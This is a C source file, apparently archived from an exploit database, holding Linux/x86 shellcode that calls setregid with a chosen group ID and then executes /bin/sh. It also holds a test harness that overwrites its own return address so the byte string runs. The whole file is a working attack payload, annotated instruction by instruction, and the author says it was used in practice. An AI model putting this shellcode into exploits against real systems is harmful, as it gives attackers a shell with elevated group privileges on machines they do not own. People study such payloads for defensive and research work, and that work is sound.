/*
 *  Linux/x86
 *  An example of setregid(), execve() /bin/sh
 *
 *  (I used this in practise, hence the setregid(12, 12);)
 */

#include <stdio.h>

char c0de[] =
/* main: */                            /* setregid(12, 12);        */
"\x29\xc0"                             /* subl %eax, %eax          */
"\xb0\x47"                             /* movb $71, %al            */
"\x29\xdb"                             /* subl %ebx, %ebx          */

/*
 *  Here's the GID for the setregid() call. Change to suit.
 */
"\xb3\x0c"                             /* movb $12, %bl            */
"\x89\xd9"                             /* movl %ebx, %ecx          */

"\xcd\x80"                             /* int $0x80                */
"\xeb\x18"                             /* jmp callz                */

/* start: */ /* execve of /bin/sh */
"\x5e"                                 /* popl %esi                */
"\x29\xc0"                             /* subl %eax, %eax          */
"\x88\x46\x07"                         /* movb %al, 0x07(%esi)     */
"\x89\x46\x0c"                         /* movl %eax, 0x0c(%esi)    */
"\x89\x76\x08"                         /* movl %esi, 0x08(%esi)    */
"\xb0\x0b"                             /* movb $0x0b, %al          */
"\x87\xf3"                             /* xchgl %esi, %ebx         */
"\x8d\x4b\x08"                         /* leal 0x08(%ebx), %ecx    */
"\x8d\x53\x0c"                         /* leal 0x0c(%ebx), %edx    */
"\xcd\x80"                             /* int $0x80                */

/* callz: */
"\xe8\xe3\xff\xff\xff"                 /* call start               */

/* /bin/sh */
"\x2f\x62\x69\x6e\x2f\x73\x68";

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(c0de));
        (*ret) = (int)c0de;
}

// milw0rm.com [2004-09-12]